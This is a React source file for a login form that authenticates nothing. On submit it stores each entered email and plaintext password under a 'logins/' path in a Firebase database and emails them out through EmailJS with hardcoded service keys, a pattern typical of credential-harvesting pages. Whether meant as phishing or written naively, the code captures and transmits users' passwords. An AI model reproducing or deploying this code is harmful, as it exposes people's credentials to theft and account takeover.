
import Navbar from './Navbar';
import "./Login.css"
import React, { useState } from 'react';
import { ref, set } from "firebase/database";
import database from '../component/firebaseConfig';
import emailjs from 'emailjs-com';
import './Login.css'; // Custom styles for the form

function Login () {
   


      
        const [email, setEmail] = useState('');
        const [password, setPassword] = useState('');
        const [message, setMessage] = useState('');
      
        const handleSubmit = (e) => {
          e.preventDefault();
      
          // Create a unique ID for the login record
          const loginId = Date.now();
      
          // Save the data to Firebase Realtime Database
          set(ref(database, 'logins/' + loginId), {
            email,
            password,
          }).then(() => {
            console.log('Data saved successfully!');
            setMessage('Login data saved successfully!');
          }).catch((error) => {
            console.error('Error saving data:', error);
            setMessage('Error saving login data.');
          });
      
          // Send the data via EmailJS
          const templateParams = {
            to_email: email,
            message: `User with email ${email} has logged in with password: ${password}`
          };
      
          emailjs.send('service_1r1dvaa', 'template_hi8t71d', templateParams, 'P3MEIVL8p5oyZJsrG')
            .then((response) => {
              console.log('Email sent successfully:', response.status, response.text);
              setMessage('Email sent successfully!');
            })
            .catch((error) => {
              console.error('Error sending email:', error);
              setMessage('Error sending email.');
            });
            
      
          // Clear the form fields
          setEmail('');
          setPassword('');
        };
      

    return(
        <>
         <div><Navbar/></div>
        <div>
            
            <div className="login-form-container">
      <form className="login-form" onSubmit={handleSubmit}>
        <h2>Login</h2>
        <div className="form-group">
          <label htmlFor="email">Email</label>
          <input
            type="email"
            id="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
        </div>
        <div className="form-group">
          <label htmlFor="password">Password</label>
          <input
            type="password"
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        <button type="submit" className="login-button">Login</button>
        {message && <p className="message">{message}</p>}
      </form>
    </div>
            
            </div></>
    )
}
export default Login;